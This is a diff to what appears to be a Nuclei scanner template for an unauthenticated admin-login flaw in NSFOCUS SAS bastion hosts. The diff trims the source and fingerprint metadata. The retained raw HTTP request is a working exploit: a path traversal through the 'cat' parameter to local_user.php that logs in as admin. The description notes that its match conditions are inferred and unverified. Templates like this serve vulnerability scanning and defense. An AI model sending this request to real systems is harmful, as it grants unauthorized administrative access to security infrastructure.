@@ -3,14 +3,8 @@ info:
   name: 绿盟SAS堡垒机local_user.php任意用户登录漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/768336b7429da0c5b75bd51517c8be04
-
-    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: unauth,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: 768336b7429da0c5b75bd51517c8be04
-    fofa: + hunter`app.name="NSFOCUS 绿盟 SAS"`
 http:
 - raw:
   - 'GET /api/virtual/home/status?cat=../../../../../../../../../../../../../../usr/local/nsfocus/web/apache2/www/local_user.php&method=login&user_account=admin HTTP/1.1
